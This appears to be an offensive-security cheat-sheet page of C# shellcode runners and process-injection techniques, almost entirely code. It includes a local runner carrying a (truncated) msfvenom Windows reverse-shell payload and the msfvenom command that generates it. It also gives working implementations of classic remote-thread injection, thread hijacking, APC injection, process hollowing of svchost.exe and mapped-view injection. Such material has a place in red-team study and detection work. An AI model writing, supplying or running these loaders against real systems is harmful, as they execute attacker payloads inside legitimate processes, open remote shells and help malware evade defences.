# ⭕ Shellcode Runners/Injectors

## <mark style="color:red;">C#</mark>&#x20;

### <mark style="color:orange;">Shellcode Runner</mark>

```csharp
using System;
using System.Runtime.InteropServices;

namespace TestClass
{
    class TestClass
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
        flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
        dwMilliseconds);
        static void Main(string[] args)
        {

// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.1 LPORT=6969 exitfunc=thread  -f csharp -a x64
    
        byte[] buf = new byte[460] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
...0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5 };


            int size = buf.Length;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, size);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class ShellcodeRunner : ITechnique
    {
        private delegate void ShellcodeDelegate();

        public void Run(Process target, byte[] shellcode)
        {
            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    // set the memory where the shellcode is to PAGE_EXECUTE_READWRITE
                    IntPtr memoryAddress = (IntPtr)ptr;
                    VirtualProtect(memoryAddress, (UIntPtr)shellcode.Length, MemoryProtection.PAGE_EXECUTE_READWRITE, out MemoryProtection lpfOldProtect);
                    Debug("[+] VirtualProtect() - set to PAGE_EXECUTE_READWRITE, shellcode address: 0x{0}", new string[] { memoryAddress.ToString("X") });

                    // execute the shellcode using a delegate function
                    Debug("[+] Executing shellcode - memory address: 0x{0}", new string[] { memoryAddress.ToString("X") });
                    ShellcodeDelegate func = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(ShellcodeDelegate));
                    func();
                }
            }
        }
    }
}
```

### <mark style="color:orange;">Classic Injection</mark>

allocates memory in the target process, injects the shellcode and starts a new thread.

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class ClassicInjection : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            // allocate some memory for our shellcode
            IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
            Debug("[+] VirtualAllocEx(), assigned: 0x{0}", new string[] { pAddr.ToString("X") });

            // write the shellcode into the allocated memory
            Debug("[+] WriteProcessMemory() - remote address: 0x{0}", new string[] { pAddr.ToString("X") });
            WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);

            // create the remote thread
            IntPtr hThread = CreateRemoteThread(target.Handle, IntPtr.Zero, 0, pAddr, IntPtr.Zero, ThreadCreationFlags.NORMAL, out hThread);
            Debug("[+] CreateRemoteThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
        }
    }
}c#
```

### <mark style="color:orange;">Thread Hijacking</mark>

hijacks a thread by injection code into the target process, suspends the hijacked thread, sets the instruction pointer (RIP) to our injected code and then resumes the thread.

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class ThreadHijack : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            ProcessThread thread = GetThread(target.Threads);
            Debug("[+] Found thread: {0}", new string[] { thread.Id.ToString() });

            // get a handle to the thread
            IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
            Debug("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });

            // allocate some memory for our shellcode
            IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
            Debug("[+] VirtualAllocEx(), assigned: 0x{0}", new string[] { pAddr.ToString("X") });

            // write the shellcode into the allocated memory
            Debug("[+] WriteProcessMemory() - remote address: 0x{0}", new string[] { pAddr.ToString("X") });
            WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);

            Debug("[+] SuspendThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            SuspendThread(hThread);

            //CONTEXT_ALL = 0x10001F
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = 0x10001F;

            // get the thread context - we are looking to manipulate the instruction pointer register
            Debug("[+] GetThreadContext() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            if(!GetThreadContext(hThread, ref ctx))
            {
                Console.WriteLine("[!] Error: {0}", GetLastError());
                return;
            }

            Debug("[+] RIP is: 0x{0}", new string[] { ctx.Rip.ToString("X") });

            // point the instruction pointer to our shellcode
            ctx.Rip = (ulong)pAddr;

            // set the thread context (update the registers)
            Debug("[+] SetThreadContext(), RIP assigned: 0x{0}", new string[] { pAddr.ToString("X") });
            SetThreadContext(hThread, ref ctx);

            Debug("[+] ResumeThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            ResumeThread(hThread);
        }

        ProcessThread GetThread(ProcessThreadCollection threads)
        {
            // find a thread
            // it is very likely that the process you are hijacking will be unstable as 0 is probably the main thread
            return threads[0];

            /*
            // you could loop through the threads looking for a better one
            foreach(ProcessThread thread in threads)
            {
            }
            */
        }
    }
}
```

### <mark style="color:orange;">Local Thread Hijacking</mark>

creates a new local thread in a suspended state, we then hijack the thread, sets the instruction pointer (RIP) to our injected code and then resume the thread.

```
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class LocalThreadHijack : ITechnique
    {

        public void Run(Process target, byte[] shellcode)
        {
            // create a new thread to hijack, in a suspended state
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, ThreadCreationFlags.CREATE_SUSPENDED, out hThread);
            Debug("[+] CreateThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });

            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    // set the memory where the shellcode is to PAGE_EXECUTE_READWRITE
                    IntPtr memoryAddress = (IntPtr)ptr;
                    VirtualProtect(memoryAddress, (UIntPtr)shellcode.Length, MemoryProtection.PAGE_EXECUTE_READWRITE, out MemoryProtection lpfOldProtect);
                    Debug("[+] VirtualProtect() - set to PAGE_EXECUTE_READWRITE, shellcode address: 0x{0}", new string[] { memoryAddress.ToString("X") });

                    //CONTEXT_ALL = 0x10001F
                    CONTEXT64 ctx = new CONTEXT64();
                    ctx.ContextFlags = 0x10001F;

                    // get the thread context - we are looking to manipulate the instruction pointer register
                    Debug("[+] GetThreadContext() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
                    if (!GetThreadContext(hThread, ref ctx))
                    {
                        Console.WriteLine("[!] Error: {0}", GetLastError());
                        return;
                    }

                    Debug("[+] RIP is: 0x{0}", new string[] { ctx.Rip.ToString("X") });

                    // point the instruction pointer to our shellcode
                    ctx.Rip = (ulong)memoryAddress;

                    // set the thread context (update the registers)
                    Debug("[+] SetThreadContext(), RIP assigned: 0x{0}", new string[] { memoryAddress.ToString("X") });
                    SetThreadContext(hThread, ref ctx);
                }
            }

            Debug("[+] ResumeThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            ResumeThread(hThread);
        }
    }
}
```

### <mark style="color:orange;">Asychronous Procedure Call (APCI) Injection</mark>

&#x20;similar to the Thread Hijacking technique. We inject the shellcode into a remote thread, then queue an APC object in the thread. When the thread enters an alertable state (when it calls `SleepEx`, `SignalObjectAndWait`, `MsgWaitForMultipleObjectsEx`, `WaitForMultipleObjectsEx`, or `WaitForSingleObjectEx`) it runs our shellcode pointed to by our queued APC object.

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class APCInjection : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            ProcessThread thread = GetThread(target.Threads);
            Debug("[+] Found thread: {0}", new string[] { thread.Id.ToString() });

            // get a handle to the thread
            IntPtr hThread = OpenThread(ThreadAccess.GET_CONTEXT | ThreadAccess.SET_CONTEXT, false, (UInt32)thread.Id);
            Debug("[+] OpenThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });

            // allocate some memory for our shellcode
            IntPtr pAddr = VirtualAllocEx(target.Handle, IntPtr.Zero, (UInt32)shellcode.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.PAGE_EXECUTE_READWRITE);
            Debug("[+] VirtualAllocEx(), assigned: 0x{0}", new string[] { pAddr.ToString("X") });

            // write the shellcode into the allocated memory
            Debug("[+] WriteProcessMemory() - remote address: 0x{0}", new string[] { pAddr.ToString("X") });
            WriteProcessMemory(target.Handle, pAddr, shellcode, shellcode.Length, out IntPtr lpNumberOfBytesWritten);

            // add an asynchronous procedure call
            Debug("[+] QueueUserAPC() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            QueueUserAPC(pAddr, hThread, IntPtr.Zero);
        }

        ProcessThread GetThread(ProcessThreadCollection threads)
        {
            // find a thread
            // it is very likely that the process you are hijacking will be unstable as 0 is probably the main thread
            return threads[0];

            /*
            // you could loop through the threads looking for a better one
            foreach(ProcessThread thread in threads)
            {
            }
            */
        }
    }
}
```

### <mark style="color:orange;">Process Hollowing</mark>

starts another process in the suspended state (svchost.exe), finds the main thread entry point, injects our shellcode into it then resumes the thread.

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class ProcessHollow : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            // Create a new process in a suspended state
            STARTUPINFO lpStartupInfo = new STARTUPINFO();
            PROCESS_INFORMATION lpProcessInformation = new PROCESS_INFORMATION();
            CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref lpStartupInfo, out lpProcessInformation);
            Debug("[+] CreateProcess(): C:\\Windows\\System32\\svchost.exe");

            // locate the PEB inside the process
            PROCESS_BASIC_INFORMATION procInformation = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = lpProcessInformation.hProcess;
            ZwQueryInformationProcess(hProcess, 0x0, ref procInformation, (uint)(IntPtr.Size * 6), ref tmp);

            // locate the image base - PEB + 0x10
            IntPtr ptrToImageBase = (IntPtr)((Int64)procInformation.PebAddress + 0x10);
            Debug("[+] Pointer to ImageBase: 0x{0}", new string[] { ptrToImageBase.ToString("X") } );

            // read the process memory
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            Debug("[+] ReadProcessMemory() - image base pointer: 0x{0}", new string[] { ptrToImageBase.ToString("X") });

            // locate svchost base, converted to a 64-bit integer then cast to an IntPtr
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Debug("[+] ImageBase: 0x{0}", new string[] { svchostBase.ToString("X") });

            // read the memory location to get the entry point from the PE header
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
            Debug("[+] ReadProcessMemory() - svchost base: 0x{0}", new string[] { svchostBase.ToString("X") });

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Debug("[+] EntryPoint: 0x{0}", new string[] { ptrToImageBase.ToString("X") });

            WriteProcessMemory(hProcess, addressOfEntryPoint, shellcode, shellcode.Length, out nRead);
            Debug("[+] WriteProcessMemory(): 0x{0}", new string[] { addressOfEntryPoint.ToString("X") });

            Debug("[+] ResumeThread() - thread handle: 0x{0}", new string[] { lpProcessInformation.hThread.ToString("X") });
            ResumeThread(lpProcessInformation.hThread);
        }
    }
}
```

### <mark style="color:orange;">Inter-Process Mapped View</mark>

creates a new section in memory, creates a local mapped view of the section, copies our shellcode into the local mapped view and creates a remote mapped view of the local mapped view in the target process. Finally we create a new thread in the target process with the mapped view as the entry point.

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

using static ShellcodeInjectionTechniques.Debugger;
using static ShellcodeInjectionTechniques.Native;

namespace ShellcodeInjectionTechniques
{
    class InterProcessMappedView : ITechnique
    {
        public void Run(Process target, byte[] shellcode)
        {
            IntPtr hSectionHandle = IntPtr.Zero;
            IntPtr pLocalView = IntPtr.Zero;
            UInt64 size = (UInt32)shellcode.Length;

            // create a new section to map view to
            UInt32 result = NtCreateSection(ref hSectionHandle, SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, MemoryProtection.PAGE_EXECUTE_READWRITE, MappingAttributes.SEC_COMMIT, IntPtr.Zero);

            if (result != 0)
            {
                Debug("[!] Unable to map view of section: {0}", new string[] { ((NTSTATUS)result).ToString() });
                return;
            }
            else
                Debug("[+] NtCreateSection() - section handle: 0x{0}", new string[] { hSectionHandle.ToString("X") });

            // create a local view
            const UInt32 ViewUnmap = 0x2;
            UInt64 offset = 0;
            result = NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_READWRITE);

            if (result != 0)
            {
                Debug("[!] Unable to map view of section: {0}", new string[] { ((NTSTATUS)result).ToString() });
                return;
            }
            else
                Debug("[+] NtMapViewOfSection() - local view: 0x{0}", new string[] { pLocalView.ToString("X") });

            // copy shellcode to the local view
            Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
            Debug("[+] Marshalling shellcode");

            // create a remote view of the section in the target
            IntPtr pRemoteView = IntPtr.Zero;
            NtMapViewOfSection(hSectionHandle, target.Handle, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, MemoryProtection.PAGE_EXECUTE_READ);
            Debug("[+] NtMapViewOfSection() - remote view: 0x{0}", new string[] { pRemoteView.ToString("X") });

            // execute the shellcode
            IntPtr hThread = IntPtr.Zero;
            CLIENT_ID cid = new CLIENT_ID();
            RtlCreateUserThread(target.Handle, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);
            Debug("[+] RtlCreateUserThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
        }
    }
}
```
